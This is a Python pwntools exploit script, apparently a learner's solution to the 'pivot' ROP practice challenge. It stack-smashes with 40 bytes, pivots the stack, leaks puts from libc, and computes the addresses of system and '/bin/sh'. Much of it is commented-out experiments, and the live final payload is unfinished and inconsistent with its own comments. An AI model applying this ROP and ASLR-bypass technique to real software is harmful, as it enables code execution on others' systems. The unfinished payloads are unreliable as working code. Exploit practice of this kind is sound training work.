from pwn import *

elf = context.binary = ELF("pivot")
p = process(elf.path)

# To automatically open GDB in separate terminal, uncomment the next 2 lines
# context.terminal = ('xfce4-terminal', '-e')
# gdb.attach(p)

# useful gadgets
POP_RAX_RET = 0x4009bb
XCHG_RSP_RAX_RET = 0x4009bd
ADD_RAX_RBP_RET = 0x4009c4
FOOTHOLD_FUNC_PLT = 0x400720     # PLT address of Foothold function
POP_RDI_RET = 0x400a33
PUTS_PLT = 0x4006e0		 # PLT address of puts@glibc
MOV_RAX_PTR_RAX_RET = 0x4009c0
FOOTHOLD_FUNC_GOT_PLT_ADDR = 0x601040      # GOT..PLT address of Foothold function
JMP_QWORDPTR_RAX = 0x400c23
POP_RBP_RET = 0x4007c8
JMP_RAX = 0x4007c1
PUTS_FUNC_GOT_PLT_ADDR = 0x60101f        # GOT..PLT address of puts function
ADD_BYTE_PTR_RAX_AL_POP_RBP_RET = 0x4007c6
RET = 0x4006b6

PUTS_GLIBC_OFFSET = 0x82360
SYSTEM_GLIBC_OFFSET = 0x52f10
POP_RSI_R15_RET = 0x400a31

PRINTF_PLT = 0x4006f0
PRINTF_GOT_PLT = 0x601028

MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']

# saving the stack pivot address given by the program in pivot_addr variable
p.recvuntil(': ')
pivot_addr = p.recvuntil('\n', drop=True)
print(pivot_addr)
pivot_addr = pivot_addr.split(b"x")[1].strip()
pivot_addr = int(pivot_addr, 16)
pivot_addr = p64(pivot_addr)
print(pivot_addr.hex())
p.recvuntil('> ')

libc = ELF('/usr/lib/libc.so.6')

def get_abs_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " is at GOT address " + hex(FUNC_GOT))
    rop = p64(POP_RDI_RET) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    # p.recvuntil("> ")
    p.clean()
    p.sendline(rop)
    # p.recvuntil("Thank you!\n")
    # leaked_string = p.readline()
    # print(leaked_string)
    # leaked_address = leaked_string.replace(b'pivot', b'').strip()
    # leak = u64(leaked_address.ljust(8, b"\x00"))
    # log.info("Leaked libc address, " + func_name + ": " + hex(leak))
    # if libc != '':
    #     libc.address = leak - libc.symbols[func_name]
    #     log.info("libc base is: " + hex(libc.address))
    # return hex(leak)

get_abs_addr("puts")

# first payload that ends up at the pivot address given by the program
# Foothold function is called first so that its absolute address gets saved in its GOT..PLT entry (the address at which its code begins once libpivot.so library is lazy binded (linked) to the program)
# next, we pop Foothold function's GOT..PLT entry address into RAX
# then value at that entry address (this value is now absolute address at which Foothold function's code is after libpivot.so is imported) is moved into RAX. Therefore, RAX now contains absolute address of Foothold, which is a value at the GOT..PLT entry address which was in RAX until MOV_RAX_PTR_RAX_RET was executed
# next 0x117 is popped into RBP because Foothold function and ret2win (function we want to call) are 117 bytes away from each other in libpivot.so
# we add 0x117 to absolute address of Foothold function, which is in RAX, and get an absolute address of ret2win now placed in RAX
# finally we jump to address in RAX and ret2win is executed, throwing us the flag

# payload_1 = p64(FOOTHOLD_FUNC_PLT)
# payload_1 += p64(POP_RAX_RET)
# payload_1 += p64(FOOTHOLD_FUNC_GOT_PLT_ADDR)
# payload_1 += p64()
# payload_1 += p64()

# payload_1 = p64(0x400750)
# payload_1 = p64(POP_RDI_RET)
# payload_1 += p64(0x400b08)
# payload_1 += p64(PUTS_PLT)

# payload_1 += p64(POP_RAX_RET)
# payload_1 += p64(PUTS_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(MOV_RAX_PTR_RAX_RET)
# payload_1 += p64(POP_RBP_RET)
# payload_1 += p64(SYSTEM_AT_GLIBC - PUTS_AT_GLIBC)
# payload_1 += p64(ADD_RAX_RBP_RET)
# payload_1 += p64(JMP_QWORDPTR_RAX)
# payload_1 += p64(JMP_RAX)

# payload_1 = p64(POP_RDI_RET)
# payload_1 += p64(PRINTF_GOT_PLT)
# payload_1 += p64(PUTS_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400b08)
# payload_1 += p64(PRINTF_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(PRINTF_GOT_PLT)
# payload_1 += p64(PUTS_PLT)

# payload_1 = p64(POP_RSI_R15_RET)
# payload_1 += p64(PUTS_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(0x0)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400aa9)
# payload_1 += p64(POP_RAX_RET)
# payload_1 += p64(0x0)
# payload_1 += p64(PRINTF_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400aa9)
# payload_1 += p64(PUTS_PLT)
# payload_1 += p64(POP_RSI_R15_RET)
# payload_1 += p64(PUTS_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(0x0)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400aa9)
# payload_1 += p64(POP_RAX_RET)
# payload_1 += p64(0x0)
# payload_1 += p64(PRINTF_PLT)
# payload_1 += p64(FOOTHOLD_FUNC_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(FOOTHOLD_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(PUTS_FUNC_GOT_PLT_ADDR)
# payload_1 += p64(PRINTF_PLT)
# payload_1 += p64(POP_RDI_RET)
# payload_1 += p64(0x400ac8)
# payload_1 += p64(PUTS_PLT)

# payload_1 = p64(FUNC)
# p.sendline(payload_1)

# second prompt for user input, here we send the junk 40 bytes to smash the stack and we send it gadgets that put pivot address into RAX, then exchange RAX with RSP, putting that address into RSP and effectively redirecting (pivoting) the stack to the address given by the program. The payload we sent in the first prompt (payload_1) is already at that location of the pivoted stack
p.recvuntil('> ')

payload_2 = b'A' * 40
payload_2 += p64(POP_RAX_RET)
payload_2 += pivot_addr
payload_2 += p64(XCHG_RSP_RAX_RET)

p.clean()
p.sendline(payload_2)
# pause()
p.recvline()        # receives the last "Thank you!" line
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base_addr = leak - libc.sym['puts']
print("puts() is at absolute address: " + hex(leak))
print("puts() offset in libc: " + hex(libc.sym['puts']))
print("libc absolute base address: " + hex(libc_base_addr))
bin_sh = libc_base_addr + next(libc.search(b"/bin/sh\x00"))
system = libc_base_addr + libc.sym['system']
print("'/bin/sh' string is at address: " + hex(bin_sh))
print("system() function is at address: " + hex(system))
# print(hex(system))

p.recvuntil('> ')
payload_1_again = p64(POP_RDI_RET) + b'Hi my name is Kristijan' + p64(PUTS_PLT)     #+ p64(bin_sh) + p64(system)
p.sendline(payload_1_again)
# p.recvuntil('> ')
# payload_2_again = b'A' * 40
# payload_2_again += p64(POP_RAX_RET)
# payload_2_again += pivot_addr
# payload_2_again += p64(XCHG_RSP_RAX_RET)

# p.sendline(payload_2_again)
# print(p.clean())
p.interactive() 

# sources referenced: https://pollevanhoof.be/nuggets/buffer_overflow_linux/3_aslr_ret2libc
#                     https://corruptedprotocol.medium.com/h-cktivitycon-2021-ctf-the-library-ret2libc-aslr-bypass-a83a8207f237